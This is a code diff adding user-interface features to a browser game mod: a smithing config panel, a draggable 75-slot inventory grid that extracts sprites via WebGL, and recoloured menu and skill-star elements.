+    Object.assign(targetTitle.style, { color: '#aaa', fontSize: '10px', marginBottom: '2px' });
+    const targetVal = document.createElement('div');
+    targetVal.textContent = `${dsk.smith.targetPct}%`;
+    Object.assign(targetVal.style, { color: '#FFD700', fontSize: '11px', fontWeight: 'bold' });
+    targetLbl.appendChild(targetTitle); targetLbl.appendChild(targetVal);
+
+    const targetBtns = document.createElement('div');
+    Object.assign(targetBtns.style, { display: 'flex', gap: '4px' });
+    function makeBtn(txt, fn) {
+      const b = document.createElement('button');
+      b.textContent = txt;
+      Object.assign(b.style, {
+        padding: '3px 10px', borderRadius: '5px', border: '1px solid #555',
+        background: '#1a1a2e', color: '#fff', cursor: 'pointer', fontSize: '12px',
+      });
+      b.onmouseenter = () => b.style.background = '#3a3a5e';
+      b.onmouseleave = () => b.style.background = '#1a1a2e';
+      b.onclick = fn; return b;
+    }
+    targetBtns.appendChild(makeBtn('-5', () => {
+      dsk.smith.targetPct = Math.max(5, dsk.smith.targetPct - 5);
+      targetVal.textContent = `${dsk.smith.targetPct}%`;
+    }));
+    targetBtns.appendChild(makeBtn('+5', () => {
+      dsk.smith.targetPct = Math.min(95, dsk.smith.targetPct + 5);
+      targetVal.textContent = `${dsk.smith.targetPct}%`;
+    }));
+    targetRow.appendChild(targetLbl); targetRow.appendChild(targetBtns);
+    body.appendChild(targetRow);
+
+    // Divider
+    const divider = document.createElement('div');
+    Object.assign(divider.style, { borderTop: '1px solid #333' });
+    body.appendChild(divider);
+
+    // Play button
+    const playBtn = document.createElement('button');
+    playBtn.dataset.sm = 'playbtn';
+    Object.assign(playBtn.style, {
+      width: '100%', padding: '8px 0', borderRadius: '6px',
+      border: '1px solid #2ecc71', background: '#1a3a2a',
+      color: '#2ecc71', cursor: 'pointer', fontSize: '12px',
+      fontWeight: 'bold', fontFamily: 'Verdana', transition: 'background .15s',
+    });
+    playBtn.textContent = '▶ Play';
+    playBtn.onclick = () => { dsk.commands['/smith'](); };
+    body.appendChild(playBtn);
+
+    smPanel.appendChild(header);
+    smPanel.appendChild(body);
+    document.body.appendChild(smPanel);
+  }
+
+  dsk.setCmd('/smithconfig', () => {
+    smm.visible = !smm.visible;
+    dsk.localMsg(`Smith Config: ${smm.visible ? 'Aberto' : 'Fechado'}`, smm.visible ? '#5f5' : '#f55');
+  });
+
+  window.smm = smm;
+})();
+
+// ══════════════════════════════════════════════════════════════
+// 🎒 INV HTML  ─  by Pablo Mod
+// 75 slots numa grade única, sprites via WebGL readPixels,
+// drag to swap entre quaisquer slots, tooltip + badge qty + dot.
+// Comando: /invhtml
+// ══════════════════════════════════════════════════════════════
+
+(function () {
+  let panel        = null;
+  let tooltip      = null;
+  let _invListener = null;
+
+  const SLOTS_TOTAL = 75;
+  const COLS        = 15;
+  const CELL        = 32;
+  const GAP         = 3;
+  const PAD         = 8;
+
+  // ── Extrai sprite via WebGL readPixels ───────────────────────
+  const _cache = {};
+  function getSpriteCanvas(spr) {
+    if (_cache[spr]) return _cache[spr];
+    try {
+      const tex   = dsk.textureById(spr);
+      if (!tex) return null;
+      const glTex = tex.baseTexture._glTextures[0];
+      if (!glTex) return null;
+      const gl    = glTex.gl;
+      const f     = tex.frame;
+
+      const fb = gl.createFramebuffer();
+      gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+      gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, glTex.texture, 0);
+
+      const pixels = new Uint8Array(f.width * f.height * 4);
+      gl.readPixels(f.x, f.y, f.width, f.height, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+      gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+      gl.deleteFramebuffer(fb);
+
+      const cv  = document.createElement('canvas');
+      cv.width  = f.width;
+      cv.height = f.height;
+      const ctx = cv.getContext('2d');
+      const imageData = ctx.createImageData(f.width, f.height);
+
+      // Flip vertical (WebGL y-invertido)
+      for (let row = 0; row < f.height; row++) {
+        const srcRow = row;
+        for (let col = 0; col < f.width; col++) {
+          const src = (srcRow * f.width + col) * 4;
+          const dst = (row    * f.width + col) * 4;
+          imageData.data[dst]     = pixels[src];
+          imageData.data[dst + 1] = pixels[src + 1];
+          imageData.data[dst + 2] = pixels[src + 2];
+          imageData.data[dst + 3] = pixels[src + 3];
+        }
+      }
+      ctx.putImageData(imageData, 0, 0);
+      _cache[spr] = cv;
+      return cv;
+    } catch (e) { return null; }
+  }
+
+  function drawSlot(cv, spr) {
+    const ctx = cv.getContext('2d');
+    ctx.clearRect(0, 0, CELL, CELL);
+    if (spr == null) return;
+    const img = getSpriteCanvas(spr);
+    if (img) ctx.drawImage(img, 0, 0, CELL, CELL);
+  }
+
+  // ── Tooltip ──────────────────────────────────────────────────
+  function ensureTooltip() {
+    if (tooltip) return;
+    tooltip = document.createElement('div');
+    Object.assign(tooltip.style, {
+      position: 'fixed', pointerEvents: 'none', zIndex: '999999',
+      background: '#1a1a2e', border: '1px solid #FFD700', borderRadius: '5px',
+      padding: '4px 9px', color: '#fff', fontSize: '11px',
+      fontFamily: 'Verdana, sans-serif', display: 'none', whiteSpace: 'nowrap',
+      boxShadow: '0 4px 10px rgba(0,0,0,0.7)',
+    });
+    document.body.appendChild(tooltip);
+  }
+  function showTip(e, txt) { if (!tooltip) return; tooltip.textContent = txt; tooltip.style.display = 'block'; moveTip(e); }
+  function moveTip(e) { if (!tooltip || tooltip.style.display === 'none') return; tooltip.style.left = (e.clientX + 14) + 'px'; tooltip.style.top = (e.clientY - 30) + 'px'; }
+  function hideTip() { if (tooltip) tooltip.style.display = 'none'; }
+
+  // ── Item data ────────────────────────────────────────────────
+  function getItem(idx) {
+    if (typeof item_data !== 'undefined' && item_data[idx]?.spr !== undefined) return item_data[idx];
+    if (typeof inv       !== 'undefined' && inv[idx]?.spr       !== undefined) return inv[idx];
+    return null;
+  }
+
+  // ── Cria painel ──────────────────────────────────────────────
+  function createPanel() {
+    if (panel) { removePanel(); return; }
+    ensureTooltip();
+
+    const gridW = COLS * CELL + (COLS - 1) * GAP;
+    const W     = gridW + PAD * 2;
+
+    panel = document.createElement('div');
+    panel.id = 'pablo-inv-html';
+    Object.assign(panel.style, {
+      position: 'fixed', top: '80px', left: '50%', transform: 'translateX(-50%)',
+      width: W + 'px', background: '#1e1e2e', border: '1px solid #444',
+      borderRadius: '10px', boxShadow: '0 8px 32px rgba(0,0,0,0.85)',
+      zIndex: '99998', fontFamily: 'Verdana, sans-serif', userSelect: 'none',
+    });
+
+    // Header
+    const header = document.createElement('div');
+    Object.assign(header.style, {
+      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+      padding: '6px 10px', background: '#2a2a3e',
+      borderRadius: '10px 10px 0 0', cursor: 'move', borderBottom: '1px solid #444',
+    });
+    const title = document.createElement('span');
+    title.textContent = '🎒 Inventory';
+    Object.assign(title.style, { color: '#FFD700', fontWeight: 'bold', fontSize: '12px' });
+    const closeBtn = document.createElement('button');
+    closeBtn.textContent = '✕';
+    Object.assign(closeBtn.style, { background: 'none', border: 'none', color: '#aaa', cursor: 'pointer', fontSize: '14px' });
+    closeBtn.onclick = removePanel;
+    header.appendChild(title); header.appendChild(closeBtn);
+
+    // Drag
+    let dragging = false, ox = 0, oy = 0;
+    const xy = e => e.touches ? { x: e.touches[0].clientX, y: e.touches[0].clientY } : { x: e.clientX, y: e.clientY };
+    header.addEventListener('mousedown', e => { if (e.target === closeBtn) return; dragging = true; panel.style.transform = 'none'; const r = panel.getBoundingClientRect(); ox = xy(e).x - r.left; oy = xy(e).y - r.top; });
+    header.addEventListener('touchstart', e => { e.preventDefault(); dragging = true; panel.style.transform = 'none'; const r = panel.getBoundingClientRect(); ox = xy(e).x - r.left; oy = xy(e).y - r.top; }, { passive: false });
+    window.addEventListener('mousemove', e => { if (dragging) { panel.style.left = (xy(e).x - ox) + 'px'; panel.style.top = (xy(e).y - oy) + 'px'; } });
+    window.addEventListener('touchmove', e => { if (dragging) { panel.style.left = (xy(e).x - ox) + 'px'; panel.style.top = (xy(e).y - oy) + 'px'; } }, { passive: false });
+    window.addEventListener('mouseup',  () => { dragging = false; });
+    window.addEventListener('touchend', () => { dragging = false; });
+
+    // Body
+    const body = document.createElement('div');
+    Object.assign(body.style, { padding: PAD + 'px' });
+
+    // Grid único 15×5
+    const grid = document.createElement('div');
+    Object.assign(grid.style, {
+      display: 'grid',
+      gridTemplateColumns: `repeat(${COLS}, ${CELL}px)`,
+      gap: GAP + 'px',
+    });
+    body.appendChild(grid);
+
+    // 75 células com separador a cada 15
+    const cells = [];
+    for (let i = 0; i < SLOTS_TOTAL; i++) {
+      if (i > 0 && i % 15 === 0) {
+        const sep = document.createElement('div');
+        Object.assign(sep.style, { gridColumn: '1 / -1', borderTop: '1px solid #2a2a4a', height: '0', margin: '1px 0' });
+        grid.appendChild(sep);
+      }
+
+      const wrap = document.createElement('div');
+      Object.assign(wrap.style, {
+        position: 'relative', width: CELL + 'px', height: CELL + 'px',
+        background: '#12121e', border: '1px solid #2a2a4a',
+        borderRadius: '4px', cursor: 'grab', boxSizing: 'border-box',
+      });
+      wrap.dataset.slot = i;
+
+      const cv = document.createElement('canvas');
+      cv.width = CELL; cv.height = CELL;
+      Object.assign(cv.style, { display: 'block', imageRendering: 'pixelated', pointerEvents: 'none' });
+      wrap.appendChild(cv);
+
+      const badge = document.createElement('div');
+      Object.assign(badge.style, {
+        position: 'absolute', bottom: '1px', right: '2px',
+        fontSize: '8px', fontFamily: 'Verdana', fontWeight: 'bold',
+        color: '#FFD700', textShadow: '0 0 2px #000, 0 0 2px #000',
+        pointerEvents: 'none', display: 'none', lineHeight: '1',
+      });
+      wrap.appendChild(badge);
+
+      const dot = document.createElement('div');
+      Object.assign(dot.style, {
+        position: 'absolute', top: '2px', left: '2px',
+        width: '5px', height: '5px', borderRadius: '50%',
+        pointerEvents: 'none', display: 'none',
+      });
+      wrap.appendChild(dot);
+
+      cells.push({ wrap, cv, badge, dot, idx: i });
+      grid.appendChild(wrap);
+    }
+
+    // Label item selecionado
+    const sep2 = document.createElement('div');
+    Object.assign(sep2.style, { borderTop: '1px solid #333', margin: '6px 0 4px' });
+    body.appendChild(sep2);
+    const selLbl = document.createElement('div');
+    selLbl.dataset.inv = 'sel';
+    selLbl.textContent = 'Hover ou clique num item';
+    Object.assign(selLbl.style, { color: '#555', fontSize: '10px', textAlign: 'center', fontStyle: 'italic' });
+    body.appendChild(selLbl);
+
+    panel.appendChild(header); panel.appendChild(body);
+    document.body.appendChild(panel);
+
+    // Drag & swap
+    let dragFrom = null;
+    cells.forEach(({ wrap, idx }) => {
+      wrap.addEventListener('mouseenter', e => {
+        wrap.style.borderColor = '#FFD700';
+        if (dragFrom !== null) wrap.style.background = '#1e1e3a';
+        const item = getItem(idx);
+        if (item) { let txt = item.n || item.t || '???'; if (item.qty > 1) txt += ` ×${item.qty}`; showTip(e, txt); }
+      });
+      wrap.addEventListener('mousemove', moveTip);
+      wrap.addEventListener('mouseleave', () => { if (dragFrom === null) wrap.style.borderColor = '#2a2a4a'; wrap.style.background = '#12121e'; hideTip(); });
+      wrap.addEventListener('click', () => {
+        const item = getItem(idx);
+        if (!item) { selLbl.textContent = '— vazio —'; selLbl.style.color = '#444'; selLbl.style.fontStyle = 'italic'; return; }
+        let txt = item.n || item.t || '???';
+        if (item.qty > 1) txt += ` ×${item.qty}`;
+        if (item.eqp === 1) txt += ' ✅';
+        if (item.eqp === 2) txt += ' 🔴';
+        selLbl.textContent = `[${idx}] ${txt}`; selLbl.style.color = '#FFD700'; selLbl.style.fontStyle = 'normal';
+      });
+      wrap.addEventListener('mousedown', e => { if (e.button !== 0) return; dragFrom = idx; wrap.style.opacity = '0.45'; wrap.style.cursor = 'grabbing'; });
+      wrap.addEventListener('mouseup', () => {
+        if (dragFrom !== null && dragFrom !== idx) { send({ type: 'sw', slot: dragFrom, swap: idx }); setTimeout(renderAll, 250); }
+        resetDrag(); dragFrom = null;
+      });
+    });
+    window.addEventListener('mouseup', () => { if (dragFrom !== null) { resetDrag(); dragFrom = null; } });
+
+    function resetDrag() {
+      cells.forEach(({ wrap }) => { wrap.style.opacity = '1'; wrap.style.cursor = 'grab'; wrap.style.borderColor = '#2a2a4a'; wrap.style.background = '#12121e'; });
+    }
+
+    function renderAll() {
+      cells.forEach(({ wrap, cv, badge, dot, idx }) => {
+        const item = getItem(idx);
+        if (!item) { drawSlot(cv, null); badge.style.display = 'none'; dot.style.display = 'none'; wrap.style.opacity = '0.25'; return; }
+        wrap.style.opacity = '1';
+        drawSlot(cv, item.spr);
+        if (item.qty > 1) { badge.textContent = item.qty >= 1000 ? (item.qty / 1000).toFixed(1) + 'k' : item.qty; badge.style.display = 'block'; } else { badge.style.display = 'none'; }
+        if      (item.eqp === 1) { dot.style.display = 'block'; dot.style.background = '#2ecc71'; }
+        else if (item.eqp === 2) { dot.style.display = 'block'; dot.style.background = '#e74c3c'; }
+        else                     { dot.style.display = 'none'; }
+      });
+    }
+
+    renderAll();
+    _invListener = renderAll;
+    dsk.on('postPacket:inv', _invListener);
+  }
+
+  function removePanel() {
+    if (_invListener) { try { dsk.off('postPacket:inv', _invListener); } catch(e) {} _invListener = null; }
+    if (panel)   { panel.remove();   panel   = null; }
+    if (tooltip) { tooltip.remove(); tooltip = null; }
+  }
+
+  dsk.setCmd('/invhtml', () => {
+    if (panel) { removePanel(); dsk.localMsg('Inv HTML: Fechado', '#f55'); }
+    else       { createPanel(); dsk.localMsg('Inv HTML: Aberto',  '#5f5'); }
+  });
+
+})();
+
+// OPTIONS
+ui_container.options.set_text("⚙ Menu");
+ui_container.options.title.style.strokeThickness = 1;
+ui_container.options.title.style.fill = 0x01ffe6;
+
+
+let bgOptions = new PIXI.Graphics();
+bgOptions.beginFill(0x87cefa, 0.30);
+bgOptions.drawRoundedRect(0, 0, 60, 32, 6);
+bgOptions.endFill();
+
+ui_container.options.addChildAt(bgOptions, 0);
+
+
+// STATS
+ui_container.stats.set_text("⚔ Stats");
+ui_container.stats.title.style.strokeThickness = 1;
+ui_container.stats.title.style.fill = 0x01ffe6;
+
+jv.stat_dialog.skill.title.style.fill = 0x01ffe6;
+jv.stat_dialog.upgrades.title.style.fill = 0x01ffe6;
+jv.stat_dialog.reincarnate.title.style.fill = 0x01ffe6;
+jv.stat_dialog.pvp.title.style.fill = 0x01ffe6;
+jv.stat_dialog.quest.title.style.fill = 0x01ffe6;
+jv.stat_dialog.appearance.title.style.fill = 0x01ffe6;
+
+
+
+let bgStats = new PIXI.Graphics();
+bgStats.beginFill(0x87cefa, 0.30);
+bgStats.drawRoundedRect(0, 0, 60, 32, 6);
+bgStats.endFill();
+
+ui_container.stats.addChildAt(bgStats, 0);
+
+let old = jv.skill_dialog.do_update;
+
+jv.skill_dialog.do_update = function() {
+    old.apply(this, arguments);
+
+    for (let o = 0; o < jv.skill_dialog.slot.length; o++) {
+        let slot = jv.skill_dialog.slot[o];
+        if (!slot?.stars?.row) continue;
+
+        for (let s = 0; s < slot.stars.row.length; s++) {
+            let star = slot.stars.row[s];
+            if (!star) continue;
+
+            // 🟢 permanente (azul anil)
+            if (star.tint === 43775) {
+                star.tint = 0x01ffe6;
+                star.alpha = 1;
+            }
+
+            // 🟡 completo (neon amarelo forte)
+            else if (star.alpha === 1) {
+                star.tint = 0xffff00;
+                star.alpha = 1;
+            }
+
+            // ⚪ incompleto (mais visível agora)
+            else {
+                star.tint = 0xff00ff;
+                star.alpha = 0.35;
+            }
+        }
+    }
+};
+
 
 // ── INICIALIZAÇÃO ────────────────────────────────────────────
 
